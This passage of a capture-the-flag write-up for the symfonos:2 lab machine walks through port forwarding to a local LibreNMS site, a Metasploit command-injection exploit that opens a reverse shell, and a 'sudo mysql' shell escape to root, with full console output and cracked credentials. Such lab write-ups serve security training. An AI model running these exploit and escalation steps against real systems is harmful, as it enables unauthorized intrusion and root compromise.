-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 49K May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Mar  7  2018 /bin/mount
-rwsr-xr-x 1 root root 40K May 17  2017 /bin/su
-rwsr-xr-x 1 root root 60K Nov 10  2016 /bin/ping
-rwsr-xr-x 1 root root 31K Mar  7  2018 /bin/umount

```

### netstat | ss

```shell
aeolus@symfonos2:~$ ss -alnt
State       Recv-Q Send-Q            Local Address:Port                           Peer Address:Port
LISTEN      0      80                    127.0.0.1:3306                                      *:*
LISTEN      0      50                            *:139                                       *:*
LISTEN      0      128                   127.0.0.1:8080                                      *:*
LISTEN      0      32                            *:21                                        *:*
LISTEN      0      128                           *:22                                        *:*
LISTEN      0      20                    127.0.0.1:25                                        *:*
LISTEN      0      50                            *:445                                       *:*
LISTEN      0      50                           :::139                                      :::*
LISTEN      0      64                           :::80                                       :::*
LISTEN      0      128                          :::22                                       :::*
LISTEN      0      20                          ::1:25                                       :::*
LISTEN      0      50                           :::445                                      :::*
```

A locally running application at port 8080.

```shell
aeolus@symfonos2:~$ curl http://localhost:8080
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url=http://localhost:8080/login" />

        <title>Redirecting to http://localhost:8080/login</title>
    </head>
    <body>
        Redirecting to <a href="http://localhost:8080/login">http://localhost:8080/login</a>.
    </body>
</html>
```

![5.a-locally-running-process](5.a-locally-running-process.png)

### port forwarding

- `enter`
- `~C`
- `enter`
- `-L 8080:localhost:8080`
- `enter`


![6.how-to-port-forward](6.how-to-port-forward.png)

![7.port-forwarded](7.port-forwarded.png)

Credentials aeolus:sergioteamo work on this site.

But there is almost nothing on this site. Maybe there is a but in this version?

![8.librenms-about](8.librenms-about.png)

## Rooted

```shell
sudo service postgresql start

msfconsole

                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'



       =[ metasploit v6.1.21-dev                          ]
+ -- --=[ 2187 exploits - 1160 auxiliary - 400 post       ]
+ -- --=[ 600 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View advanced module options with
advanced

msf6 > search librenms

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/linux/http/librenms_collectd_cmd_inject  2019-07-15       excellent  Yes    LibreNMS Collectd Command Injection
   1  exploit/linux/http/librenms_addhost_cmd_inject   2018-12-16       excellent  No     LibreNMS addhost Command Injection


Interact with a module by name or index. For example info 1, use 1 or use exploit/linux/http/librenms_addhost_cmd_inject

msf6 exploit(linux/http/librenms_collectd_cmd_inject) > use 1
[*] Using configured payload cmd/unix/reverse
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > options

Module options (exploit/linux/http/librenms_addhost_cmd_inject):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password for LibreNMS
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base LibreNMS path
   USERNAME                    yes       User name for LibreNMS
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux


msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set PASSWORD sergioteamo
PASSWORD => sergioteamo
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set RHOSTS localhost
RHOSTS => localhost
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set RPORT 8080
RPORT => 8080
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set USERNAME aeolus
USERNAME => aeolus
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set LHOST 192.168.56.70
LHOST => 192.168.56.70
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > run
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP double handler on 192.168.56.70:4444
[-] Exploit aborted due to failure: not-found: Failed to access the login page
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP double handler on 192.168.56.70:4444
[*] Successfully logged into LibreNMS. Storing credentials...
[+] Successfully added device with hostname LNPKyKbdlQ
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Successfully deleted device with hostname LNPKyKbdlQ and id #1
[*] Command: echo TzB7NqWRSJ3tsTFs;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "TzB7NqWRSJ3tsTFs\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.56.70:4444 -> 192.168.56.89:33266 ) at 2022-01-05 20:21:57 +0530
[*] Session 1 created in the background.
[*] Exploiting target 192.168.56.84
[*] Started reverse TCP double handler on 192.168.56.70:4444
[-] Exploit aborted due to failure: not-found: Failed to access the login page
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.168.56.70:4444 -> 192.168.56.89:33266  (127.0.0.1)

msf6 exploit(linux/http/librenms_addhost_cmd_inject) > sessions -i 1
[*] Starting interaction with 1...


whoami
cronus
id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
hostname
symfonos2
date
Wed Jan  5 14:22:39 CST 2022
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql


sudo mysql -e '\! /bin/sh'

id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
date
Wed Jan  5 14:23:54 CST 2022
cd /root
ls
proof.txt
cat proof.txt

        Congrats on rooting symfonos:2!

           ,   ,
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,
  ,`   ,   { {      } }                                             }/
 ;     ,--/`\ \    / /                                     }/      /,/
;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
; /   `       } } `, `-`-.___                            / `,  ,/  `,/
 \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
  `        { {                                     __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,

        Contact me via Twitter @zayotic to give feedback!

```

![9.rooted](9.rooted.png)

## How to hack

1. Find log.txt on SMB
2. Use `site cp{fr|to}` command to get hold of improperly backedup files.
3. Use SMB to download the files.
4. Crack hashes
5. Access SSH
6. Notice locally running web application
7. Forward the port to your machine
8. Use metasploit to get access to the target
9. Check what user is running and what it can do.
10. gtfobins mysql to root


</body>
</html>
